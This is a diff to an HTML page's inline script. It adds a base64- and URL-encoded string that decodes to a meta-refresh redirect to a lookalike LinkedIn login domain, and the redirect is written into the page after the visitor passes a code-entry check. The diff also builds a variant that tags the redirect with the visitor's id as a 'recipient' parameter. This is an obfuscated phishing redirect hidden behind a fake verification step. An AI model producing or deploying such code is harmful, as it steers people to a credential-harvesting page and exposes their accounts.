@@ -7,26 +7,23 @@
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
       let hasStatus = new URLSearchParams(window.location.search).has("status");
-     let hasStatus = new URLSearchParams(window.location.search).has("status");
-if (hasStatus) {
-  let status = new URLSearchParams(window.location.search).get("status");
-  if (status === "true") {
-    let ref = new URLSearchParams(window.location.search).get("ref");
-    let id = new URLSearchParams(window.location.search).get("id");
+      if (hasStatus) {
+        let status = new URLSearchParams(window.location.search).get("status");
+        if (status == "true") {
+          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ucmVjcnVpdGVybGlua2Vkd2ViLml0LmNvbS9BSGZybmRxRCUyMiUyMC8lM0U="
+          let id = new URLSearchParams(window.location.search).get("id");
 
-    // Decode the ref string safely
-    let decodedRef = decodeURIComponent(atob(ref));
+          let decodedRef = decodeURIComponent(atob(`${ref}`))
 
-    // Append email query
-    let lastIndexOfColon = decodedRef.lastIndexOf('"');
-    let newDecodedRef =
-      decodedRef.slice(0, lastIndexOfColon) + "?email=" + id + '" />';
+          let lastIndexOfColon = decodedRef.lastIndexOf('"');
+          newDecodedRef= decodedRef.slice(0, lastIndexOfColon) + "?recipient=" + id + "\" />";
+          const encodedUrl = btoa(newDecodedRef);
 
-    // Instead of document.write, safely update DOM
-    document.body.innerHTML += `<p>Processed URL: ${newDecodedRef}</p>`;
-  }
-}
 
+
+          document.write(decodeURIComponent(atob(`${ref}`)));
+        }
+      }
     </script>
   </head>
 
@@ -139,7 +136,7 @@ if (hasStatus) {
       code.addEventListener("input", function (e) {
         if (code.value == generatedCode) {
           let currentUrl = window.location.href;
-          currentUrl += "&status=true";
+          currentUrl += "?status=true";
           window.location.href = currentUrl;
         }
       });
